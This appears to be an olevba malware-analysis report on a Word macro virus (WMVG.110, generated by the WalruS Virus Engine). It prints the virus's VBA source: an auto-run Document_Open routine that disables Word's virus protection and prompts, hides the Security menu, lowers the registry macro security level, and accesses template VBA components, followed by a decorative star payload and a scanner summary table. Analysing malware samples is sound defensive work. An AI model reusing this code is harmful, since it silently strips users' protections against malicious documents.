olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG.110-d3c20e35dfc350bdbba120931893b67dc2a87fb7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO n.cls 
in file: Virus.MSWord.WMVG.110-d3c20e35dfc350bdbba120931893b67dc2a87fb7 - OLE stream: 'Macros/VBA/n'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Virus Name : n
' Virus Author : The WalruS Virus Engine (WVE) Random Virus Utility

' A Virus Created By The WalruS Virus Engine (WVE)

Private Sub Document_Open()
    Call VUJ4072
End Sub
HeDoVnBi = KnPz14314 & LpVk9996
Private Sub VUJ4072()
ReRe14602 = DuUlUnOj & DjJj7596 & Int(Rnd * 4268)
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
EvBkSsNz = DzAh11518 & VjKf8377
AiGrOpQh = CyNm7009 & UnJq4251
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
WordBasic.DisableAutoMacros 0
Application.DisplayStatusBar = False
OwFnKvUt = JwNf13243 & PzHx3103
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
Set VFC1346 = NormalTemplate.VBProject.VBComponents(1)
Set AKD7859 = ActiveDocument.VBProject.VBComponents(1)
IuLy9685 = TiSkNwKg & VoDo13986 & Int(Rnd * 5653)
TxPqOjFg = EnOt9466 & GmUq9735
QuJt8710 = JtEnGkEq & KwUh10706 & Int(Rnd * 4840)
JiJzVqRt = JhPl3086 & HePl7254
GgNpLvTw = BvJw13412 & HhHe11170
KVQ1727 = Int(Rnd * 88)
If Trigger = 3 Then Call PCR5564
End Sub
Private Sub PCR5564()
On Error Resume Next
TzQe8186 = SjQuGiRw & TtUh14223 & Int(Rnd * 7789)
StarWidth = 25: StarHeight = 25
For i = 1 To 10
TopPos = Rnd() * (ActiveWindow.UsableHeight - StarHeight): LeftPos = Rnd() * (ActiveWindow.UsableWidth - StarWidth)
Set NewStar = ActiveDocument.Shapes.AddShape _
(msoShape4pointStar, LeftPos, TopPos, StarWidth, StarHeight)
NewStar.Fill.Visible = msoTrue: NewStar.Fill.Solid
NewStar.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Oldtimer1 = Timer: While (Timer < Oldtimer1 + 1): Wend
DoEvents
Next i
Oldtimer2 = Timer: While (Timer < Oldtimer2 + 2): Wend
Set myShapes = ActiveDocument.Shapes
For Each shp In myShapes
If Left(shp.Name, 9) = "AutoShape" Then
shp.Delete
Oldtimer3 = Timer: While (Timer < Oldtimer3 + 1): Wend
End If
Next
ActiveDocument.Shapes().Visible = True
End Sub
Sub ToolsMacro()
ImAq10448 = MeHoPoBq & UuKo2940 & Int(Rnd * 2464)
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
' Another Virus Created By The WalruS Virus Generator (WVE) Version 1.10

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

